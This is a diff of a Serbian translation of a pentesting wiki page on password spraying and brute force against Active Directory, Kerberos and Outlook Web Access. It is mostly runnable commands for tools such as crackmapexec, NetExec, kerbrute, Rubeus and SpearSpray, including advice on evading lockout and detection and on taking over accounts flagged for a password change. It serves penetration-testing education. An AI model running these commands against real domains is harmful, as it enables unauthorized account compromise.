@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Kada pronađete nekoliko **valid usernames** možete pokušati najčešće **common passwords** (imajte na umu password policy okruženja) sa svakim od otkrivenih korisnika.\
-Po **default** minimalna **password** **length** je **7**.
+Kada pronađete nekoliko **važećih korisničkih imena** možete za svako otkriveno korisničko ime pokušati najčešće **lozinke** (imajući u vidu politiku lozinki okruženja).\
+Po **podrazumevanju** **minimalna** **dužina** **lozinke** je **7**.
 
-Liste **common usernames** takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Liste čestih korisničkih imena takođe mogu biti korisne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Imajte na umu da biste mogli **lockout some accounts if you try several wrong passwords** (po **default** više od 10).
+Obratite pažnju da **biste mogli zaključati neke naloge ako pokušate nekoliko pogrešnih lozinki** (po podrazumevanju više od 10).
 
-### Get password policy
+### Dobijanje politike lozinki
 
-Ako imate user credentials ili shell kao domain user možete **get the password policy with**:
+Ako imate korisničke kredencijale ili shell kao domain user možete **dobiti politiku lozinki pomoću**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -31,14 +31,29 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Eksploatacija sa Linuxa (ili svih)
+### Exploitation sa Linuxa (ili sa svih sistema)
 
-- Korišćenje **crackmapexec:**
+- Koristeći **crackmapexec:**
 ```bash
 crackmapexec smb <IP> -u users.txt -p passwords.txt
 # Local Auth Spray (once you found some local admin pass or hash)
 ## --local-auth flag indicate to only try 1 time per machine
 crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
+```
+- Korišćenje **NetExec (naslednik CME)** za ciljano, diskretno spraying preko SMB/WinRM:
+```bash
+# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
+netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts
+
+# Spray a single candidate password against harvested users over SMB
+netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
+--continue-on-success --no-bruteforce --shares
+
+# Validate a hit over WinRM (or use SMB exec methods)
+netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"
+
+# Tip: sync your clock before Kerberos-based auth to avoid skew issues
+sudo ntpdate <DC_FQDN>
 ```
 - Korišćenje [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
 ```bash
@@ -47,16 +62,16 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 # Brute-Force
 ./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
 ```
-- [**spray**](https://github.com/Greenwolf/Spray) _**(možete navesti broj pokušaja da biste izbegli zaključavanje naloga):**_
+- [**spray**](https://github.com/Greenwolf/Spray) _**(možete navesti broj pokušaja da izbegnete lockouts):**_
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIJE PREPORUČENO, PONEKAD NE RADI
+- Korišćenje [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NE PREPORUČUJE SE, PONEKAD NE RADI
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-- Korišćenjem modula `scanner/smb/smb_login` u okviru **Metasploit**:
+- Sa modulom `scanner/smb/smb_login` iz **Metasploit**:
 
 ![](<../../images/image (745).png>)
 
@@ -69,7 +84,7 @@ done
 ```
 #### Sa Windowsa
 
-- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja sadrži brute module:
+- Sa [Rubeus](https://github.com/Zer1t0/Rubeus) verzijom koja uključuje brute modul:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,20 +92,20 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Uz [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Podrazumevano može da generiše korisnike iz domena i preuzme politiku lozinki iz domena i ograniči pokušaje u skladu sa njom):
+- Uz [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Podrazumevano može da generiše korisnike iz domena i preuzima politiku lozinki iz domena i ograničava pokušaje u skladu s njom):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-- Sa [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- Pomoću [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 ```
 Invoke-SprayEmptyPassword
 ```
-### Identifikujte i preuzmite naloge "Password must change at next logon" (SAMR)
+### Identifikujte i preuzmite naloge sa "Password must change at next logon" (SAMR)
 
-Nisko-bučna tehnika je izvršiti password spraying sa neškodljivom/praznom lozinkom i detektovati naloge koji vraćaju STATUS_PASSWORD_MUST_CHANGE, što ukazuje da je lozinka prisilno istekla i može se promeniti bez poznavanja stare.
+Niskoprofilna tehnika je da se izvrši password spray korišćenjem bezopasne/prazne lozinke i identifikuju nalozi koji vraćaju STATUS_PASSWORD_MUST_CHANGE, što ukazuje da je lozinka prisilno istekla i da se može promeniti bez poznavanja stare.
 
 Workflow:
-- Enumerišite korisnike (RID brute via SAMR) da biste napravili listu ciljeva:
+- Izlistajte korisnike (RID brute via SAMR) da biste sastavili listu ciljeva:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
@@ -99,12 +114,12 @@ Workflow:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Spray praznu password i nastavi sa hits kako bi uhvatio naloge koji moraju da promene pri sledećem logonu:
+- Spray praznu password i nastavi na hits da bi uhvatio naloge koji moraju da promene password pri next logon:
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- Za svaki hit, promenite lozinku preko SAMR-a pomoću modula NetExec (stara lozinka nije potrebna kada je "must change" postavljeno):
+- Za svaki hit, promenite lozinku preko SAMR-a pomoću NetExec-ovog modula (stara lozinka nije potrebna kada je "must change" postavljeno):
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -114,24 +129,24 @@ netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
 netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
 Operativne napomene:
-- Uverite se da je sat na vašem hostu sinhronizovan sa DC pre operacija zasnovanih na Kerberosu: `sudo ntpdate <dc_fqdn>`.
-- A [+] without (Pwn3d!) u nekim modulima (npr., RDP/WinRM) znači da su creds validni, ali nalog nema prava za interaktivnu prijavu.
+- Uverite se da je sat na vašem hostu sinhronizovan sa DC pre Kerberos-based operations: `sudo ntpdate <dc_fqdn>`.
+- Oznaka [+] bez (Pwn3d!) u nekim modulima (npr., RDP/WinRM) znači da su creds validni, ali nalogu nedostaju prava za interaktivno prijavljivanje.
 
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
+### Kerberos pre-auth spraying sa LDAP targeting i PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth–based spraying smanjuje šum u odnosu na SMB/NTLM/LDAP bind pokušaje i bolje se uklapa u AD lockout politike. SpearSpray kombinuje LDAP-driven targeting, pattern engine i svest o politikama (domain policy + PSOs + badPwdCount buffer) da bi spray-ovao precizno i bezbedno. Takođe može označiti kompromitovane principe u Neo4j za BloodHound pathing.
+Kerberos pre-auth–based spraying smanjuje buku u odnosu na SMB/NTLM/LDAP bind pokušaje i bolje se slaže sa AD politikama zaključavanja. SpearSpray kombinuje ciljanje vođeno LDAP-om, mehanizam šablona i svesnost o politikama (domain policy + PSOs + badPwdCount buffer) kako bi vršio spray precizno i bezbedno. Takođe može tagovati kompromitovane naloge u Neo4j za BloodHound pathing.
 
 Key ideas:
-- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
-- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
-- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
-- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
-- Throughput control with threads, jitter, and max requests per second.
-- Optional Neo4j integration to mark owned users for BloodHound.
+- Otkriće korisnika preko LDAP-a sa straničenjem i LDAPS podrškom, opcionalno koristeći prilagođene LDAP filtere.
+- Politika zaključavanja domena + PSO-svesno filtriranje da ostavi konfigurabilni rezervni broj pokušaja (threshold) i izbegne zaključavanje korisnika.
+- Kerberos pre-auth validation koristeći brze gssapi bindings (generiše 4768/4771 na DC-ima umesto 4625).
+- Generisanje lozinki zasnovano na šablonima, po korisniku, koristeći promenljive kao što su imena i vremenske vrednosti izvedene iz pwdLastSet svakog korisnika.
+- Kontrola propusnosti pomoću niti, jitter-a i max zahteva po sekundi.
+- Opcionalna Neo4j integracija za označavanje owned korisnika za BloodHound.
 
 Basic usage and discovery:
 ```bash
@@ -174,17 +189,17 @@ Pregled sistema obrazaca (patterns.txt):
 {samaccountname}
 {extra}{separator}{year}{suffix}
 ```
-Dostupne varijable uključuju:
+Dostupne promenljive uključuju:
 - {name}, {samaccountname}
-- Vremenske vrednosti iz pwdLastSet svakog korisnika (ili whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Pomoćne varijable za sastav i org token: {separator}, {suffix}, {extra}
+- Vremenske vrednosti iz pwdLastSet (ili whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Pomoćne funkcije za kompoziciju i org token: {separator}, {suffix}, {extra}
 
 Operativne napomene:
-- Preporučljivo je upitovati PDC-emulator sa -dc da biste pročitali najpouzdanije badPwdCount i informacije vezane za politiku.
-- Resetovanje badPwdCount se pokreće pri sledećem pokušaju nakon observation window; koristite threshold i timing da ostanete bezbedni.
-- Kerberos pre-auth attempts se evidentiraju kao 4768/4771 u DC telemetry; koristite jitter i rate-limiting da se uklopite.
+- Preferirajte upite ka PDC-emulatoru sa -dc da pročitate najautoritatilniji badPwdCount i informacije vezane za policy.
+- badPwdCount reset-i se pokreću pri sledećem pokušaju nakon posmatranog vremenskog okvira; koristite threshold i timing da ostanete bezbedni.
+- Kerberos pre-auth attempts se pojavljuju kao 4768/4771 u DC telemetry; koristite jitter i rate-limiting da se uklopite.
 
-> Savet: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
+> Savet: SpearSpray’s default LDAP page size is 200; prilagodite sa -lps po potrebi.
 
 ## Outlook Web Access
 
@@ -196,7 +211,7 @@ Postoji više alata za p**assword spraying outlook**.
 - Sa [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Sa [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lozinka ili mala lista lozinki za password spraying.
+Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i jedan password ili mala lista passwords za spray.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -215,7 +230,7 @@ Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lo
 - [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 - [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## Reference
+## Izvori
 
 - [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
 - [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
@@ -227,6 +242,7 @@ Da biste koristili bilo koji od ovih alata, potrebna vam je lista korisnika i lo
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 - [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
+- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
